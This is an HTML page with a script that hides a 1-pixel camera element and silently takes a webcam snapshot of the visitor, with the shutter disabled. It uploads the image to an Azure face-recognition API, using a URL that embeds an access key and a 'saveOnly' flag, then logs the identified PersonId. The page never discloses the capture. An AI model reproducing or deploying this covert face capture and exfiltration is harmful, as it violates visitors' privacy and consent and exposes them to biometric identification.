<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="jpeg_camera/jpeg_camera_no_flash.js" type="text/javascript"></script>
<script src="jpeg_camera/canvas-to-blob.js" type="text/javascript"></script>
</head>
<div id="camera" style="height:1px;width:1px"></div>
<script>

var camera = new JpegCamera("#camera");
camera.ready(() => {
var snapshot = camera.capture({shutter:false});
snapshot.upload({api_url: "https://ioudasdotsfaceapi.azurewebsites.net/api/RecognizeFace?code=4Kapx/61HmagCNM0K8dNPfy/5MmvK1ISVUBZE1QCuzp4vwMPC3Sy5g==&debug&saveOnly"}).done(function(response) {
  console.log(JSON.parse(response).PersonId);
  this.discard();
}).fail(function(status_code, error_message, response) {
  console.error("Upload failed with status " + status_code);
});

});
</script>
</html>
